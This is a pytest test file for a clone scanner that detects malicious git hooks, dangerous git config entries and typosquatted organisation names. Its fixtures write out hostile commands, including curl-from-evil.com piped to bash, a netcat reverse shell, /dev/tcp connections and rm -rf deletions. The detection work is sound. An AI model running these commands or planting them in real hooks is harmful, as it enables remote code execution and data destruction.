"""Tests for the clone scanner module."""

import os
import stat
from pathlib import Path

import pytest

from vibefort.clonescan import GitCloneFinding, check_git_hooks, check_typosquatted_org


# ── check_git_hooks ──────────────────────────────────────────────────────


def _make_hook(tmp_path: Path, name: str, content: str) -> Path:
    """Create a fake git hook file inside .git/hooks/."""
    hooks_dir = tmp_path / ".git" / "hooks"
    hooks_dir.mkdir(parents=True, exist_ok=True)
    hook = hooks_dir / name
    hook.write_text(content)
    hook.chmod(hook.stat().st_mode | stat.S_IEXEC)
    return hook


class TestCheckGitHooks:
    def test_curl_pipe_bash(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit", "#!/bin/sh\ncurl http://evil.com/x | bash\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1
        assert any("curl" in f.description.lower() or "pipe" in f.description.lower() for f in findings)
        assert all(f.severity in ("critical", "high") for f in findings)

    def test_wget_pipe_bash(self, tmp_path: Path):
        _make_hook(tmp_path, "post-checkout", "#!/bin/sh\nwget -q http://evil.com/x | bash\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1

    def test_python_inline_exec(self, tmp_path: Path):
        _make_hook(tmp_path, "post-commit", '#!/bin/sh\npython -c "import os; os.system(\'rm -rf /\')"\n')
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1

    def test_python3_inline_exec(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-push", '#!/bin/sh\npython3 -c "import os"\n')
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1

    def test_base64_decode(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit", "#!/bin/sh\necho aGVsbG8= | base64 --decode | bash\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1

    def test_eval_pattern(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit", '#!/bin/sh\neval "$PAYLOAD"\n')
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1

    def test_netcat(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit", "#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1

    def test_import_socket(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit", "#!/usr/bin/env python3\nimport socket\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1

    def test_import_subprocess(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit", "#!/usr/bin/env python3\nimport subprocess\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1

    def test_dev_tcp(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit", "#!/bin/sh\ncat < /dev/tcp/10.0.0.1/80\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1

    def test_rm_rf_home(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit", "#!/bin/sh\nrm -rf ~/\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1

    def test_chmod_777(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit", "#!/bin/sh\nchmod 777 /etc/passwd\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1

    def test_sample_hooks_ignored(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit.sample", "#!/bin/sh\ncurl http://evil.com | bash\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) == 0

    def test_safe_hook_npx_lint_staged(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit", "#!/bin/sh\nnpx lint-staged\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) == 0

    def test_safe_hook_simple_echo(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit", '#!/bin/sh\necho "Running tests"\nnpm test\n')
        findings = check_git_hooks(tmp_path)
        assert len(findings) == 0

    def test_unknown_hook_name_ignored(self, tmp_path: Path):
        _make_hook(tmp_path, "my-custom-hook", "#!/bin/sh\ncurl http://evil.com | bash\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) == 0

    def test_no_hooks_dir(self, tmp_path: Path):
        findings = check_git_hooks(tmp_path)
        assert findings == []

    def test_finding_has_file_field(self, tmp_path: Path):
        _make_hook(tmp_path, "pre-commit", "#!/bin/sh\ncurl http://x | bash\n")
        findings = check_git_hooks(tmp_path)
        assert len(findings) >= 1
        assert "pre-commit" in findings[0].file


# ── check_typosquatted_org ───────────────────────────────────────────────


class TestCheckTyposquattedOrg:
    def test_https_typosquat_google(self):
        findings = check_typosquatted_org("https://github.com/goggle/some-repo.git")
        assert len(findings) == 1
        assert "google" in findings[0].description.lower()
        assert findings[0].severity in ("critical", "high")

    def test_https_typosquat_microsoft(self):
        findings = check_typosquatted_org("https://github.com/microsft/vscode.git")
        assert len(findings) == 1
        assert "microsoft" in findings[0].description.lower()

    def test_ssh_typosquat_facebook(self):
        findings = check_typosquatted_org("git@github.com:facebok/react.git")
        assert len(findings) == 1
        assert "facebook" in findings[0].description.lower()

    def test_exact_known_org_not_flagged(self):
        findings = check_typosquatted_org("https://github.com/google/protobuf.git")
        assert len(findings) == 0

    def test_exact_known_org_https(self):
        findings = check_typosquatted_org("https://github.com/facebook/react.git")
        assert len(findings) == 0

    def test_unknown_org_not_flagged(self):
        findings = check_typosquatted_org("https://github.com/somebodyunknown/myrepo.git")
        assert len(findings) == 0

    def test_unknown_org_ssh_not_flagged(self):
        findings = check_typosquatted_org("git@github.com:randomuser123/project.git")
        assert len(findings) == 0

    def test_ssh_url_parsing(self):
        findings = check_typosquatted_org("git@gitlab.com:gogle/repo.git")
        assert len(findings) == 1

    def test_https_no_dotgit_suffix(self):
        findings = check_typosquatted_org("https://github.com/gogle/repo")
        assert len(findings) == 1

    def test_distance_3_not_flagged(self):
        # "goo" is distance 3 from "google", should not flag
        findings = check_typosquatted_org("https://github.com/goo/repo")
        assert len(findings) == 0

    def test_finding_dataclass_fields(self):
        findings = check_typosquatted_org("https://github.com/goggle/repo.git")
        assert len(findings) == 1
        f = findings[0]
        assert f.rule
        assert f.description
        assert f.severity

    def test_ssh_protocol_url(self):
        findings = check_typosquatted_org("ssh://git@github.com/microsft/vscode.git")
        assert any(f.rule == "typosquatted-org" for f in findings)

    def test_git_protocol_url(self):
        findings = check_typosquatted_org("git://github.com/microsft/vscode.git")
        assert any(f.rule == "typosquatted-org" for f in findings)


class TestGitConfigScanning:
    def test_detects_custom_hookspath(self, tmp_path):
        git_dir = tmp_path / ".git"
        git_dir.mkdir()
        (git_dir / "config").write_text("[core]\n\thooksPath = .githooks\n")
        findings = check_git_hooks(str(tmp_path))
        assert any(f.rule == "custom-hookspath" for f in findings)

    def test_detects_fsmonitor(self, tmp_path):
        git_dir = tmp_path / ".git"
        git_dir.mkdir()
        (git_dir / "config").write_text("[core]\n\tfsmonitor = /tmp/malicious-script\n")
        findings = check_git_hooks(str(tmp_path))
        assert any(f.rule == "fsmonitor-hook" for f in findings)

    def test_detects_malicious_filter(self, tmp_path):
        git_dir = tmp_path / ".git"
        git_dir.mkdir()
        (git_dir / "config").write_text('[filter "evil"]\n\tsmudge = curl https://evil.com | bash\n')
        findings = check_git_hooks(str(tmp_path))
        assert any(f.rule == "malicious-filter" for f in findings)

    def test_clean_git_config(self, tmp_path):
        git_dir = tmp_path / ".git"
        git_dir.mkdir()
        (git_dir / "config").write_text("[core]\n\trepositoryformatversion = 0\n")
        findings = check_git_hooks(str(tmp_path))
        assert len(findings) == 0
